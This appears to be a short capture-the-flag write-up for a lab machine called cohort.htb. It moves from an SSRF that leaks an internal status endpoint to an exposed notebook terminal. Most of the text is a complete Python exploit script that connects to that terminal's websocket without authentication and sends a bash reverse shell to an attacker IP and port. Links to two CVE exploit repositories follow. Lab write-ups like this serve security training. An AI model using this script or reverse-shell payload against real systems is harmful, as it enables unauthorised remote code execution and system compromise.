port 8888 exposed through SSRF
<img width="460" height="822" alt="image" src="https://github.com/user-attachments/assets/7c574852-23d3-4bae-bde1-a35c9ced2619" />

/status endpoint is accessible!

`
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
`


<img width="440" height="740" alt="image" src="https://github.com/user-attachments/assets/1219f91b-8798-4ee7-831d-bdb33caeafb5" />



Fuzz results
<img width="901" height="507" alt="image" src="https://github.com/user-attachments/assets/41d28e08-ca62-4ffd-abcb-3885d2881d62" />


```
import asyncio
import re
import ssl
import websockets

LHOST, LPORT = "10.10.14.80", 4444
TARGET = "nb-1be3782a8afd3ad5.cohort.htb"
PORT = 443

ssl_context = ssl._create_unverified_context()

ANSI = re.compile(r'\x1b\[[0-9;?]*[a-zA-Z]')

async def exploit(host, port):
    uri = f"wss://{host}:{port}/terminal/ws"
    async with websockets.connect(uri, ssl=ssl_context, subprotocols=["terminal"]) as ws:
        print("[+] Connection established without authentication")
        await asyncio.sleep(0.3)

        try:
            banner = await asyncio.wait_for(ws.recv(), timeout=2)
            print("[PTY banner]:", repr(banner))
        except asyncio.TimeoutError:
            pass

        payload = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\n"
        await ws.send(payload)
        print(f"[+] Payload sent — check your listener on {LHOST}:{LPORT}")

        output = []
        while True:
            try:
                output.append(await asyncio.wait_for(ws.recv(), timeout=3))
            except (asyncio.TimeoutError, websockets.ConnectionClosed):
                break

        clean = ANSI.sub('', "".join(output)).strip()
        if clean:
            print("[output]:", clean)

if __name__ == "__main__":
    asyncio.run(exploit(TARGET, PORT))
```
source: https://github.com/h3raklez/CVE-2026-39987

<img width="508" height="149" alt="image" src="https://github.com/user-attachments/assets/50068c4b-3e63-4798-a3e9-c7420d1ecc16" />




CVE exploit at:
https://github.com/ashrafzaryouh/CVE-2026-41651/blob/main/CVE-2026-41651.py

<img width="407" height="221" alt="image" src="https://github.com/user-attachments/assets/91f7f1f1-aa2c-44d9-8e15-6a5c1415aba0" />
